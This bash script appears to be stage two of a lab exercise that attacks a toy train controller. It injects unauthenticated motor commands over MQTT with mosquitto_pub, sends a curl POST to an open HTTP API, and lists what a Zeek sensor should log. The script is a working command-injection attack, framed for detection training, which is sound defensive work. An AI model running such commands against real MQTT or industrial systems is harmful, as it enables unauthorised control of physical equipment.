#!/usr/bin/env bash
# Stage 2 — MQTT Direct Command Injection
# Zeek visibility: mqtt.log PUBLISH to cmd/+ from attacker IP (not controller IP)
set -euo pipefail

BROKER="${BROKER:-mosquitto}"
TRAIN="${TRAIN:-t1}"
ATTACKER_IP="${ATTACKER_IP:-192.168.100.53}"

echo "=== [mqtt-inject] Stage 2: Direct command injection ==="
echo ""

echo "--- Sending motor command: forward, power=99 ---"
echo "  (controller will clamp to MAX_POWER=50, but wire shows 99)"
mosquitto_pub -h "$BROKER" -A "$ATTACKER_IP" \
  -t "choochoo/train/${TRAIN}/cmd/motor" \
  -m '{"action":"motor","direction":"forward","power":99}'
echo "  Sent. Watch the train UI at http://web-mqtt:8000"
echo ""

sleep 2

echo "--- Injecting via HTTP API (no MQTT required) ---"
echo "  Web UI is 0.0.0.0:8000 with CORS=* — no MQTT client needed"
curl -sS -X POST "http://web-mqtt:8000/api/motor" \
  -H 'Content-Type: application/json' \
  -d '{"direction":"reverse","power":40}' | python3 -m json.tool 2>/dev/null || true
echo ""

sleep 2

echo "--- Sending stop ---"
mosquitto_pub -h "$BROKER" -A "$ATTACKER_IP" \
  -t "choochoo/train/${TRAIN}/cmd/stop" \
  -m '{}'
echo "  Stopped."

echo ""
echo "[mqtt-inject] Done. Check mqtt.log on the sensor — look for:"
echo "  PUBLISH to choochoo/train/t1/cmd/motor from attacker IP (not controller IP)"
echo "  function=PUBLISH, topic=.../cmd/motor, payload visible in cleartext"
